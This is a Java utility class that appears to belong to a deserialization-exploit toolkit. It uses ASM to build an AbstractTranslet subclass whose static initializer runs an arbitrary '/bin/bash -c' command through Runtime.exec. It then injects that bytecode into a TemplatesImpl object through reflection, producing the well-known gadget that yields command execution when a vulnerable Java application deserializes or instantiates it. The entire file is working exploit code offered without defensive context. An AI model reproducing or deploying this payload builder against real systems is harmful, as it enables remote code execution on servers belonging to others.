package util;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import jdk.internal.org.objectweb.asm.ClassWriter;
import jdk.internal.org.objectweb.asm.Label;
import jdk.internal.org.objectweb.asm.MethodVisitor;
import jdk.internal.org.objectweb.asm.Opcodes;

public class ASMUtil implements Opcodes {

    public static TemplatesImpl createTemplates(String command) {
        ClassWriter classWriter = new ClassWriter(0);
        MethodVisitor methodVisitor;
        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "Temp", null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);

        classWriter.visitSource("Temp.java", null);

        {
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(9, label0);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", "<init>", "()V", false);
            methodVisitor.visitInsn(RETURN);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLocalVariable("this", "LTemp;", null, label0, label1, 0);
            methodVisitor.visitMaxs(1, 1);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(20, label0);
            methodVisitor.visitInsn(RETURN);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLocalVariable("this", "LTemp;", null, label0, label1, 0);
            methodVisitor.visitLocalVariable("document", "Lcom/sun/org/apache/xalan/internal/xsltc/DOM;", null, label0, label1, 1);
            methodVisitor.visitLocalVariable("handlers", "[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;", null, label0, label1, 2);
            methodVisitor.visitMaxs(0, 3);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(25, label0);
            methodVisitor.visitInsn(RETURN);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLocalVariable("this", "LTemp;", null, label0, label1, 0);
            methodVisitor.visitLocalVariable("document", "Lcom/sun/org/apache/xalan/internal/xsltc/DOM;", null, label0, label1, 1);
            methodVisitor.visitLocalVariable("iterator", "Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;", null, label0, label1, 2);
            methodVisitor.visitLocalVariable("handler", "Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;", null, label0, label1, 3);
            methodVisitor.visitMaxs(0, 4);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/io/IOException");
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(12, label0);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            methodVisitor.visitInsn(ICONST_3);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/String");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitLdcInsn("/bin/bash");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitLdcInsn("-c");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_2);
            methodVisitor.visitLdcInsn(command);
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            methodVisitor.visitInsn(POP);
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(14, label1);
            Label label3 = new Label();
            methodVisitor.visitJumpInsn(GOTO, label3);
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(13, label2);
            methodVisitor.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[]{"java/io/IOException"});
            methodVisitor.visitVarInsn(ASTORE, 0);
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(15, label3);
            methodVisitor.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            methodVisitor.visitInsn(RETURN);
            methodVisitor.visitMaxs(5, 1);
            methodVisitor.visitEnd();
        }
        classWriter.visitEnd();

        byte[] bytes = classWriter.toByteArray();
        TemplatesImpl templates = new TemplatesImpl();
        CommonUtil.setFieldValue(templates, "_name", "FooTemp");
        CommonUtil.setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        CommonUtil.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }
}
